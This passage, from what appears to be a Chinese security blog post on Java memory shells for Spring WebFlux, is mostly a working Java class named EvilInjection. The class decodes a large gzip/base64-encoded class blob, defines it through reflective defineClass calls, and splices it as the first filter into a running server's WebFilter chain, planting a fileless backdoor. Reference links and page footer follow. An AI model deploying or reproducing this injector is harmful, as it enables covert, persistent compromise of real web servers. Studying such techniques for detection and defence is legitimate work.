class="string">&quot;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&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilInjection</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">filteringWebHandler</span> <span class="operator">=</span> getFilteringWebHandler();  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">defaultWebFilterChain</span> <span class="operator">=</span> getDefaultWebFilterChain(filteringWebHandler);  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">webFilter</span> <span class="operator">=</span> getWebFilter();  </span><br><span class="line">            addWebFilter(filteringWebHandler, defaultWebFilterChain, webFilter);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">getFilteringWebHandler</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Thread[] threads = (Thread[]) invokeMethod(Thread.class, <span class="string">&quot;getThreads&quot;</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">FilteringWebHandler</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; threads.length; i++) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">  </span><br><span class="line">                FilteringWebHandler = getFV(getFV(getFV(getFV(getFV(getFV(threads[i], <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;httpHandler&quot;</span>), <span class="string">&quot;delegate&quot;</span>), <span class="string">&quot;delegate&quot;</span>), <span class="string">&quot;delegate&quot;</span>);  </span><br><span class="line">                <span class="keyword">return</span> FilteringWebHandler;  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> FilteringWebHandler;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">getDefaultWebFilterChain</span><span class="params">(Object filteringWebHandler)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            chain = getFV(filteringWebHandler, <span class="string">&quot;chain&quot;</span>);  </span><br><span class="line">            <span class="keyword">return</span> chain;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> chain;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">getWebFilter</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">webfilter</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            webfilter = classLoader.loadClass(getClassName()).newInstance();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="type">byte</span>[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));  </span><br><span class="line">                <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);  </span><br><span class="line">                defineClass.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> (Class) defineClass.invoke(classLoader, clazzByte, <span class="number">0</span>, clazzByte.length);  </span><br><span class="line">                webfilter = clazz.newInstance();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> webfilter;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addWebFilter</span><span class="params">(Object filteringWebHandler, Object defaultWebFilterChain, Object webFilter)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getFV(defaultWebFilterChain, <span class="string">&quot;handler&quot;</span>);  </span><br><span class="line">        List&lt;WebFilter&gt; AllFilters = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(((DefaultWebFilterChain) defaultWebFilterChain).getFilters());  </span><br><span class="line">        AllFilters.add(<span class="number">0</span>, (WebFilter) webFilter);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">DefaultWebFilterChain</span> <span class="variable">newChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebFilterChain</span>((WebHandler) handler, AllFilters);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">chainField</span> <span class="operator">=</span> filteringWebHandler.getClass().getDeclaredField(<span class="string">&quot;chain&quot;</span>);  </span><br><span class="line">        chainField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">        modifersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        modifersField.setInt(chainField, chainField.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">        chainField.set(filteringWebHandler, newChain);  </span><br><span class="line">        modifersField.setInt(chainField, chainField.getModifiers() &amp; Modifier.FINAL);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] decodeBase64(String base64Str) <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;  </span><br><span class="line">        Class&lt;?&gt; decoderClass;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            decoderClass = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);  </span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoderClass.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(decoderClass.newInstance(), base64Str);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;  </span><br><span class="line">            decoderClass = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> decoderClass.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);  </span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, base64Str);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] gzipDecompress(<span class="type">byte</span>[] compressedData) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(compressedData);  </span><br><span class="line">        <span class="type">GZIPInputStream</span> <span class="variable">ungzip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(in);  </span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">256</span>];  </span><br><span class="line">        <span class="type">int</span> n;  </span><br><span class="line">        <span class="keyword">while</span> ((n = ungzip.read(buffer)) &gt;= <span class="number">0</span>) &#123;  </span><br><span class="line">            out.write(buffer, <span class="number">0</span>, n);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFV</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getF(obj, fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title function_">getF</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException &#123;  </span><br><span class="line">        Class&lt;?&gt; clazz = obj.getClass();  </span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);  </span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="keyword">return</span> field;  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;  </span><br><span class="line">                clazz = clazz.getSuperclass();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(fieldName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Object <span class="title function_">invokeMethod</span><span class="params">(Object targetObject, String methodName)</span> <span class="keyword">throws</span> NoSuchMethodException, IllegalAccessException, InvocationTargetException &#123;  </span><br><span class="line">        <span class="keyword">return</span> invokeMethod(targetObject, methodName, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Object <span class="title function_">invokeMethod</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String methodName, Class[] paramClazz, Object[] param)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> (obj <span class="keyword">instanceof</span> Class) ? (Class) obj : obj.getClass();  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tempClass</span> <span class="operator">=</span> clazz;  </span><br><span class="line">        <span class="keyword">while</span> (method == <span class="literal">null</span> &amp;&amp; tempClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="keyword">if</span> (paramClazz == <span class="literal">null</span>) &#123;  </span><br><span class="line">                    <span class="comment">// Get all declared methods of the class  </span></span><br><span class="line">                    Method[] methods = tempClass.getDeclaredMethods();  </span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methods.length; i++) &#123;  </span><br><span class="line">                        <span class="keyword">if</span> (methods[i].getName().equals(methodName) &amp;&amp; methods[i].getParameterTypes().length == <span class="number">0</span>) &#123;  </span><br><span class="line">                            method = methods[i];  </span><br><span class="line">                            <span class="keyword">break</span>;  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                    method = tempClass.getDeclaredMethod(methodName, paramClazz);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;  </span><br><span class="line">                tempClass = tempClass.getSuperclass();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(methodName);  </span><br><span class="line">        &#125;  </span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="keyword">return</span> method.invoke(<span class="literal">null</span>, param);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e.getMessage());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="keyword">return</span> method.invoke(obj, param);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e.getMessage());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44435110/article/details/137056222">设计模式｜发布-订阅模式（Publish-Subscribe Pattern）_发布订阅模式-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/felordcn/p/13747262.html">Java反应式框架Reactor中的Mono和Flux - 码农小胖哥 - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/559158740">一文弄懂 Spring WebFlux 的来龙去脉 - 知乎</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WebFluxDemo"><span class="toc-number">2.</span> <span class="toc-text">WebFluxDemo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%91%E5%B8%83%E2%80%94%E2%80%94%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">发布——订阅模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mono%E5%92%8CFlux"><span class="toc-number">3.2.</span> <span class="toc-text">Mono和Flux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mono%EF%BC%9A%E5%8D%95%E4%B8%80%E7%BB%93%E6%9E%9C%E6%88%96%E7%A9%BA%E5%80%BC%E7%9A%84%E5%BC%82%E6%AD%A5%E5%AE%B9%E5%99%A8%E2%80%8B"><span class="toc-number">3.2.1.</span> <span class="toc-text">Mono：单一结果或空值的异步容器​</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flux%EF%BC%9A%E5%A4%9A%E5%85%83%E7%B4%A0%E6%B5%81%E5%BC%8F%E5%A4%84%E7%90%86%E7%9A%84%E9%80%9A%E7%94%A8%E5%AE%B9%E5%99%A8%E2%80%8B"><span class="toc-number">3.2.2.</span> <span class="toc-text">Flux：多元素流式处理的通用容器​</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WebFlux%E4%B8%AD%E7%9A%84Filter"><span class="toc-number">4.</span> <span class="toc-text">WebFlux中的Filter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WebFilter"><span class="toc-number">4.1.</span> <span class="toc-text">WebFilter</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">参考文章</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&text=Java内存马篇——WebFLux型"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&title=Java内存马篇——WebFLux型"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&is_video=false&description=Java内存马篇——WebFLux型"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java内存马篇——WebFLux型&body=Check out this article: http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&title=Java内存马篇——WebFLux型"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&title=Java内存马篇——WebFLux型"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&title=Java内存马篇——WebFLux型"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
